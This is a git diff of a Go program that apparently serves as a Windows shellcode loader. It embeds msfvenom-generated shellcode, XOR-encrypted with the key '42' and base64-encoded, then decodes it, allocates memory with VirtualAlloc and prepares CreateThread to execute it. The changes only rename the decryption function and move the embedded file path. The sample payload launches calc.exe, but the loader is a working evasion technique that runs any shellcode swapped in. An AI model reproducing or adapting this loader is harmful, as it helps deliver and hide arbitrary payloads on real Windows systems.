@@ -14,15 +14,15 @@ var (
 	CreateThread  = kernel32DLL.NewProc("CreateThread")
 )
 
-//go:embed sc.xor.42.b64
+//go:embed shellcode/sc.xor.42.b64
 //msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
 // XOR Encrypted with '42'
 var enc_sc_b64 string 
 
 // https://kylewbanks.com/blog/xor-encryption-using-go
-// EncryptDecrypt runs a XOR encryption on the input string, encrypting it if it hasn't already been,
+// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
 // and decrypting it if it has, using the key provided.
-func EncryptDecrypt(input, key string) (output []byte) {
+func xor(input, key string) (output []byte) {
 	for i := 0; i < len(input); i++ {
 			output = append(output, input[i] ^ key[i % len(key)])
 	}
@@ -39,7 +39,7 @@ func main() {
 
 	key := "42"
 	enc_sc, _ := b64.StdEncoding.DecodeString(enc_sc_b64)
-	sc := EncryptDecrypt(string(enc_sc), key)
+	sc := xor(string(enc_sc), key)
 
 	// Allocate a memory buffer for the payload
 	addr, err := windows.VirtualAlloc(
